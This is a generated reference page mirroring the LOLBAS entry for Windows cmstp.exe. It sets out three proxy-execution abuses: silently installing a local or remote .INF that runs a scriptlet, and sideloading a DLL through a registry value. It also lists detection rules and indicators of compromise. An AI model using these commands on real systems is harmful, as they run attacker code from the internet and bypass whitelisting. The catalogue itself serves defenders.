---
title: "Cmstp.exe"
framework: "lolbas"
generated: "true"
source_path: "yml/OSBinaries/Cmstp.yml"
source_url: "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Cmstp.yml"
build_date: "2026-04-27 18:39:01"
category: "OSBinaries"
aliases:
  - "Cmstp.exe"
functions:
  - "Execute"
  - "AWL Bypass"
attack_technique_ids:
  - "T1218.003"
tags:
  - "lolbas"
  - "living-off-the-land"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Cmstp.exe

Installs or removes a Connection Manager service profile.

## Metadata

- Category: OSBinaries
- Created: 2018-05-25
- Author: Oddvar Moe
- Source Path: yml/OSBinaries/Cmstp.yml

## Paths

- `C:\Windows\System32\cmstp.exe`
- `C:\Windows\SysWOW64\cmstp.exe`

## Commands

### 1. Execute

Silently installs a specially formatted local .INF without creating a desktop icon. The .INF file contains a UnRegisterOCXSection section which executes a .SCT file using scrobj.dll.

```cmd
cmstp.exe /ni /s {PATH_ABSOLUTE:.inf}
```

- Use Case: Execute code hidden within an inf file. Download and run scriptlets from internet.
- Privileges: User
- Operating System: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218.003]]

### 2. AWL Bypass

Silently installs a specially formatted remote .INF without creating a desktop icon. The .INF file contains a UnRegisterOCXSection section which executes a .SCT file using scrobj.dll.

```cmd
cmstp.exe /ni /s {REMOTEURL:.inf}
```

- Use Case: Execute code hidden within an inf file. Execute code directly from Internet.
- Privileges: User
- Operating System: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218.003]]

### 3. Execute

cmstp.exe reads the `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\cmmgr32.exe\CmstpExtensionDll` registry value and passes its data directly to `LoadLibrary`. By modifying this registry key and setting it to an attack-controlled DLL, this will sideload the DLL via `cmstp.exe`.

```cmd
cmstp.exe /nf
```

- Use Case: Proxy execution of a malicious DLL via registry modification.
- Privileges: Administrator
- Operating System: Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218.003]]

## Detections

- Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_cmstp_execution_by_creation.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_uac_bypass_cmstp.yml
- Splunk: https://github.com/splunk/security_content/blob/bee2a4cefa533f286c546cbe6798a0b5dec3e5ef/detections/endpoint/cmlua_or_cmstplua_uac_bypass.yml
- Elastic: https://github.com/elastic/detection-rules/blob/82ec6ac1eeb62a1383792719a1943b551264ed16/rules/windows/defense_evasion_suspicious_managedcode_host_process.toml
- Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_unusual_process_network_connection.toml
- IOC: Execution of cmstp.exe without a VPN use case is suspicious
- IOC: DotNet CLR libraries loaded into cmstp.exe
- IOC: DotNet CLR Usage Log - cmstp.exe.log
- IOC: Registry modification to HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\cmmgr32.exe\CmstpExtensionDll

## Resources

- {'Link': 'https://twitter.com/NickTyrer/status/958450014111633408'}
- {'Link': 'https://gist.github.com/NickTyrer/bbd10d20a5bb78f64a9d13f399ea0f80'}
- {'Link': 'https://gist.github.com/api0cradle/cf36fd40fa991c3a6f7755d1810cc61e'}
- {'Link': 'https://oddvar.moe/2017/08/15/research-on-cmstp-exe/'}
- {'Link': 'https://gist.githubusercontent.com/tylerapplebaum/ae8cb38ed8314518d95b2e32a6f0d3f1/raw/3127ba7453a6f6d294cd422386cae1a5a2791d71/UACBypassCMSTP.ps1'}
- {'Link': 'https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmstp'}
- {'Link': 'https://gist.github.com/ghosts621/ea8ad5b8a0904dd40b33f01f0e8285dc'}

## Acknowledgements

- {'Person': 'Oddvar Moe', 'Handle': '@oddvarmoe'}
- {'Person': 'Nick Tyrer', 'Handle': '@NickTyrer'}
- {'Person': 'Naor Evgi', 'Handle': '@ghosts621'}

## Source

- [LOLBAS project](https://lolbas-project.github.io/)
- [Source YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Cmstp.yml)
